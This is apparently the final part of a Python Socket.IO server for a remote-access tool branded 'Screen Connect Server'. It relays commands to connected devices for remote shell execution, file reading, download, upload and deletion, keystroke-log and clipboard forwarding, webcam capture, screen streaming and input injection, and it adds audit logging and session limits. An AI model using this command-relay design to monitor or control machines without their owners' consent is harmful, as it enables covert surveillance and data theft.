        sio.emit("update_system_tab", data, room="dashboards")

    @sio.on("processes_report")
    def _r_procs(data):
        did = data.get("device_id", "")
        sio.emit("processes_result", data, room=f"view:{did}")
        sio.emit("processes_result", data, room="dashboards")

    @sio.on("kill_result")
    def _r_kill(data):
        did = data.get("device_id", "")
        sio.emit("kill_result", data, room=f"view:{did}")

    @sio.on("start_process_result")
    def _r_start_proc(data):
        did = data.get("device_id", "")
        sio.emit("start_process_result", data, room=f"view:{did}")

    @sio.on("shell_result")
    def _r_shell(data):
        did = data.get("device_id", "")
        sio.emit("shell_result", data, room=f"view:{did}")
        sio.emit("shell_result", data, room="dashboards")

    @sio.on("file_list_result")
    def _r_flist(data):
        did = data.get("device_id", "")
        sio.emit("file_list_result", data, room=f"view:{did}")
        sio.emit("file_list_result", data, room="dashboards")

    @sio.on("file_read_result")
    def _r_fread(data):
        did = data.get("device_id", "")
        sio.emit("file_read_result", data, room=f"view:{did}")
        sio.emit("file_read_result", data, room="dashboards")

    @sio.on("file_download_result")
    def _r_fdl(data):
        did = data.get("device_id", "")
        sio.emit("file_download_result", data, room=f"view:{did}")
        sio.emit("file_download_result", data, room="dashboards")

    @sio.on("file_delete_result")
    def _r_fdel(data):
        did = data.get("device_id", "")
        sio.emit("file_delete_result", data, room=f"view:{did}")

    @sio.on("drives_report")
    def _r_drives(data):
        did = data.get("device_id", "")
        sio.emit("drives_report", data, room=f"view:{did}")
        sio.emit("drives_report", data, room="dashboards")

    @sio.on("disks_report")
    def _r_disks(data):
        did = data.get("device_id", "")
        sio.emit("disks_report", data, room=f"view:{did}")
        sio.emit("disks_report", data, room="dashboards")

    @sio.on("network_report")
    def _r_net(data):
        did = data.get("device_id", "")
        sio.emit("network_report", data, room=f"view:{did}")
        sio.emit("network_report", data, room="dashboards")

    @sio.on("webcam_result")
    def _r_webcam(data):
        did = data.get("device_id", "")
        sio.emit("webcam_result", data, room=f"view:{did}")
        sio.emit("webcam_result", data, room="dashboards")

    @sio.on("webcam_list_result")
    def _r_wcam_list(data):
        did = data.get("device_id", "")
        sio.emit("webcam_list_result", data, room=f"view:{did}")

    @sio.on("keylog_data")
    def _r_keylog(data):
        did = data.get("device_id", "")
        sio.emit("keylog_data", data, room=f"view:{did}")
        sio.emit("keylog_data", data, room="dashboards")

    @sio.on("clipboard_data")
    def _r_clip(data):
        did = data.get("device_id", "")
        sio.emit("clipboard_data", data, room=f"view:{did}")

    @sio.on("clipboard_result")
    def _r_clip_result(data):
        did = data.get("device_id", "")
        sio.emit("clipboard_result", data, room=f"view:{did}")
        sio.emit("clipboard_result", data, room="dashboards")

    @sio.on("clipboard_set_result")
    def _r_clip_set(data):
        did = data.get("device_id", "")
        sio.emit("clipboard_set_result", data, room=f"view:{did}")

    @sio.on("action_result")
    def _r_action(data):
        did = data.get("device_id", "")
        sio.emit("action_result", data, room=f"view:{did}")
        sio.emit("action_result", data, room="dashboards")

    @sio.on("stream_stats")
    def _r_stream_stats(data):
        did = data.get("device_id", "")
        sio.emit("stream_stats", data, room=f"view:{did}")

    @sio.on("agent_alert")
    def _r_agent_alert(data):
        """Forward resource alerts to all dashboards."""
        did = data.get("device_id", "")
        sio.emit("agent_alert", data, room=f"view:{did}")
        sio.emit("agent_alert", data, room="dashboards")
        _audit("agent_alert", device_id=did, type=data.get("type"), value=data.get("value"))
        _fire_webhook("agent_alert", data)

    # ── Dashboard → device commands ───────────────────────────────────────────
    @sio.on("dashboard_command")
    def on_cmd(data):
        did = data.get("device_id")
        with _dev_lock:
            dev = _devices.get(did)
        if not dev:
            emit("command_error", {"error": f"Device '{did}' not connected."})
            return
        sio.emit("request_action", data, room=did)
        log.info(f"Dashboard command → {did}: tab={data.get('tab')}")

    @sio.on("start_stream")
    def on_start_stream(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            join_room(f"view:{did}")
            with _view_lock:
                _viewers[did].add(request.sid)
            with _dash_lock:
                _dashboard_device[request.sid] = did
            sio.emit("request_action", {
                "tab":       "monitor",
                "action":    "start",
                "device_id": did,
                "fps":       data.get("fps", 20),
                "quality":   data.get("quality", 55),
                "scale":     data.get("scale", 0.8),
                "mode":      data.get("mode", "video"),
                "monitor":   data.get("monitor", 1),
            }, room=did)
        else:
            emit("command_error", {"error": f"Device '{did}' not connected."})

    @sio.on("stop_stream")
    def on_stop_stream(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, room=did)

    @sio.on("set_stream_mode")
    def on_set_stream_mode(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab": "monitor", "action": "set_mode",
                "mode": data.get("mode", "video"), "device_id": did,
            }, room=did)

    @sio.on("set_quality")
    def on_set_quality(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab": "monitor", "action": "set_quality",
                "quality": data.get("quality", 55), "device_id": did,
            }, room=did)

    @sio.on("request_screenshot")
    def on_request_screenshot(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab":       "screenshot",
                "quality":   data.get("quality", 60),
                "scale":     data.get("scale", 0.75),
                "device_id": did,
            }, room=did)

    @sio.on("mouse_event")
    def on_mouse(data):
        did = data.get("device_id", "")
        if not did: return
        _touch_viewer_activity(request.sid)
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            evt = {
                "device_id": did,
                "type": "mouse_click" if data.get("action") in ("down","up","click") else "mouse_move",
                "x": data.get("x", 0),
                "y": data.get("y", 0),
                "button": data.get("button", "left"),
                "down": data.get("action") == "down",
            }
            sio.emit("input_event", evt, room=agent_sid)
        else:
            with _dev_lock:
                dev = _devices.get(did)
            if dev:
                sio.emit("request_action", {"tab": "mouse_event", **data}, room=did)

    @sio.on("scroll_event")
    def on_scroll(data):
        did = data.get("device_id", "")
        if not did: return
        _touch_viewer_activity(request.sid)
        agent_sid = _adv_agent_sids.get(did)
        if agent_sid:
            sio.emit("input_event", {
                "device_id": did, "type": "mouse_scroll",
                "x": data.get("x", 0), "y": data.get("y", 0), "delta": data.get("delta", 3),
            }, room=agent_sid)
        else:
            with _dev_lock:
                dev = _devices.get(did)
            if dev:
                sio.emit("request_action", {"tab": "scroll", **data}, room=did)

    @sio.on("key_event")
    def on_key(data):
        did = data.get("device_id", "")
        _touch_viewer_activity(request.sid)
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "key_event", **data}, room=did)

    @sio.on("ping_agent")
    def on_ping(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "ping", "t": data.get("t", utcnow()), "device_id": did}, room=did)

    @sio.on("disconnect_screen")
    def on_disconnect_screen(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "monitor", "action": "stop", "device_id": did}, room=did)

    @sio.on("start_sysmon")
    def on_start_sysmon(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab": "system", "action": "start",
                "interval": data.get("interval", 2), "device_id": did,
            }, room=did)

    @sio.on("stop_sysmon")
    def on_stop_sysmon(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "system", "action": "stop", "device_id": did}, room=did)

    @sio.on("request_snapshot")
    def on_snapshot(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "system_snapshot", "device_id": did}, room=did)

    @sio.on("request_disks")
    def on_disks(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "disks", "device_id": did}, room=did)

    @sio.on("request_network")
    def on_network(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "network", "device_id": did}, room=did)

    @sio.on("list_processes")
    def on_list_procs(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "processes", "device_id": did}, room=did)

    @sio.on("kill_process")
    def on_kill_proc(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "kill_process", "pid": data.get("pid"), "device_id": did}, room=did)

    @sio.on("start_process")
    def on_start_proc(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "start_process", "command": data.get("command", ""), "device_id": did}, room=did)

    @sio.on("shell_command")
    def on_shell(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab":        "shell",
                "command":    data.get("command", "echo hello"),
                "shell_type": data.get("shell_type", "cmd"),
                "device_id":  did,
            }, room=did)

    @sio.on("file_list")
    def on_file_list(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_list", "path": data.get("path", "C:\\"), "device_id": did}, room=did)

    @sio.on("file_read")
    def on_file_read(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_read", "path": data.get("path", ""), "device_id": did}, room=did)

    @sio.on("file_download")
    def on_file_download(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_download", "path": data.get("path", ""), "device_id": did}, room=did)

    @sio.on("file_delete")
    def on_file_delete(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "file_delete", "path": data.get("path", ""), "device_id": did}, room=did)

    @sio.on("file_upload")
    def on_file_upload(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {
                "tab": "file_upload", "path": data.get("path", ""),
                "content": data.get("content", ""), "device_id": did,
            }, room=did)

    @sio.on("request_drives")
    def on_drives(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "drives", "device_id": did}, room=did)

    @sio.on("clipboard_get")
    def on_clip_get(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "clipboard_get", "device_id": did}, room=did)

    @sio.on("clipboard_set")
    def on_clip_set(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "clipboard_set", "text": data.get("text", ""), "device_id": did}, room=did)

    @sio.on("power_command")
    def on_power(data):
        did     = data.get("device_id", "")
        command = data.get("command", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": command, "device_id": did}, room=did)
            _audit("power_command", device_id=did, command=command)

    @sio.on("uninstall_agent")
    def on_uninstall(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "uninstall", "device_id": did}, room=did)

    @sio.on("webcam_capture")
    def on_webcam_capture(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "webcam", "camera": data.get("camera", 0), "device_id": did}, room=did)

    @sio.on("webcam_list")
    def on_webcam_list(data):
        did = data.get("device_id", "")
        with _dev_lock:
            dev = _devices.get(did)
        if dev:
            sio.emit("request_action", {"tab": "webcam_list", "device_id": did}, room=did)

    # ══════════════════════════════════════════════════════════════════════════
    #  Watchdog — heartbeat timeout + viewer idle/duration enforcement
    # ══════════════════════════════════════════════════════════════════════════
    def _watchdog_loop():
        """
        Runs every 15s. Enforces three enterprise policies:
        1. Heartbeat timeout — mark device offline if silent
        2. Viewer idle timeout — kick idle viewers (VIEWER_IDLE_TIMEOUT)
        3. Max session duration — kick viewers that exceed MAX_SESSION_DURATION
        """
        while True:
            try:
                time.sleep(15)
                now_dt = datetime.datetime.utcnow()
                now_mono = time.monotonic()

                # ── Policy 1: Heartbeat timeout ───────────────────────────
                stale = []
                with _dev_lock:
                    for did, dev in list(_devices.items()):
                        lb = dev.get("last_beat")
                        if lb:
                            try:
                                last = datetime.datetime.fromisoformat(lb.replace("Z", ""))
                                if (now_dt - last).total_seconds() > HEARTBEAT_TIMEOUT:
                                    stale.append((did, dev.get("label", did), dev.get("sid", "")))
                            except Exception:
                                pass
                    for did, label, agent_sid in stale:
                        del _devices[did]
                        log.warning(f"Watchdog: device silent — marking offline: {label} ({did})")

                for did, label, agent_sid in stale:
                    _notify_viewers_reconnecting(did)
                    db_update(did, {"status": "offline", "disconnected_at": utcnow()})
                    _audit("watchdog_offline", device_id=did, label=label)
                    if agent_sid:
                        with _sid_lock:
                            _sid_to_device.pop(agent_sid, None)
                    with _adv_gop_lock:
                        _adv_gop_buf.pop(did, None)
                    sio.emit("agent_offline",  {"device_id": did, "label": label, "ts": utcnow()})
                    sio.emit("device_offline", {"device_id": did, "label": label, "ts": utcnow()})
                    _fire_webhook("watchdog_offline", {"device_id": did, "label": label})
                if stale:
                    broadcast_device_update()

                # ── Policy 2 & 3: Viewer idle / max duration enforcement ──
                if VIEWER_IDLE_TIMEOUT <= 0 and MAX_SESSION_DURATION <= 0:
                    continue  # both disabled — nothing to do

                to_kick: list = []  # list of (sid, reason)
                with _viewer_activity_lock:
                    for vsid, start in list(_viewer_session_start.items()):
                        # Idle timeout
                        if VIEWER_IDLE_TIMEOUT > 0:
                            last_input = _viewer_last_activity.get(vsid, start)
                            idle_s = now_mono - last_input
                            if idle_s >= VIEWER_IDLE_TIMEOUT:
                                to_kick.append((vsid, f"Idle timeout ({int(idle_s)}s)"))
                                continue
                        # Max session duration
                        if MAX_SESSION_DURATION > 0:
                            duration_s = now_mono - start
                            if duration_s >= MAX_SESSION_DURATION:
                                to_kick.append((vsid, f"Session duration limit ({int(duration_s)}s)"))

                for vsid, reason in to_kick:
                    log.info(f"Watchdog: kicking viewer {vsid}: {reason}")
                    try:
                        sio.emit("kicked", {"reason": reason, "ts": utcnow()}, room=vsid)
                        sio.disconnect(vsid)
                        _cleanup_viewer(vsid)
                        _audit("viewer_kicked_by_policy", viewer_sid=vsid, reason=reason)
                    except Exception as e:
                        log.debug(f"Watchdog kick error for {vsid}: {e}")

            except Exception as exc:
                _report_crash("_watchdog_loop", exc)
                time.sleep(5)

    sio.start_background_task(_watchdog_loop)

    # ══════════════════════════════════════════════════════════════════════════
    #  Render keep-alive self-ping
    # ══════════════════════════════════════════════════════════════════════════
    def _self_ping_loop():
        if SELF_PING_INTERVAL <= 0 or not REQUESTS_OK:
            return
        threading.current_thread().name = "self-ping"
        time.sleep(90)
        render_url = os.environ.get("RENDER_EXTERNAL_URL", "").rstrip("/")
        local_url  = f"http://127.0.0.1:{PORT}/health"
        ping_url   = f"{render_url}/health" if render_url else local_url
        log.info(f"Self-ping loop started: {ping_url} every {SELF_PING_INTERVAL}s")
        while True:
            try:
                resp = _requests.get(ping_url, timeout=15)
                log.debug(f"Self-ping: {resp.status_code}")
            except Exception as e:
                log.debug(f"Self-ping failed: {e}")
            time.sleep(SELF_PING_INTERVAL)

    sio.start_background_task(_self_ping_loop)

# ══════════════════════════════════════════════════════════════════════════════
#  Startup banner
# ══════════════════════════════════════════════════════════════════════════════
def startup():
    log.info("=" * 70)
    log.info(f"  Screen Connect Server  v{VERSION}  — ENTERPRISE EDITION")
    log.info("=" * 70)
    log.info(f"  Port:               {PORT}")
    log.info(f"  Heartbeat ttl:      {HEARTBEAT_TIMEOUT}s")
    log.info(f"  Agent exclusive:    {AGENT_EXCLUSIVE}")
    log.info(f"  Max viewers/device: {MAX_VIEWERS_PER_DEVICE or 'unlimited'}")
    log.info(f"  Viewer idle kick:   {VIEWER_IDLE_TIMEOUT or 'disabled'}s")
    log.info(f"  Max session dur:    {MAX_SESSION_DURATION or 'unlimited'}s")
    log.info(f"  Rate limit:         {_RATE_LIMIT_RPM} req/min per IP (all routes)")
    log.info(f"  Webhook:            {'enabled → ' + WEBHOOK_URL[:40] if WEBHOOK_URL else 'disabled'}")
    log.info(f"  Stream relay:       ISOLATED — per-device view rooms")
    log.info(f"  Session handoff:    ENABLED — viewers auto-resume on agent reconnect")
    log.info(f"  Viewer kick API:    POST /api/viewer/<sid>/kick  (admin key required)")
    log.info(f"  Live sessions API:  GET  /api/sessions/live      (admin key required)")
    log.info("=" * 70)
    log.info("  RENDER start:")
    log.info("    gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \\")
    log.info("             -w 1 --timeout 300 --keep-alive 75 --bind 0.0.0.0:$PORT server:app")
    log.info("=" * 70)

# ══════════════════════════════════════════════════════════════════════════════
#  Entry point
# ══════════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    startup()
    if SOCKETIO_OK and sio:
        sio.run(app, host="0.0.0.0", port=PORT, debug=False, allow_unsafe_werkzeug=True)
    else:
        app.run(host="0.0.0.0", port=PORT, debug=False)
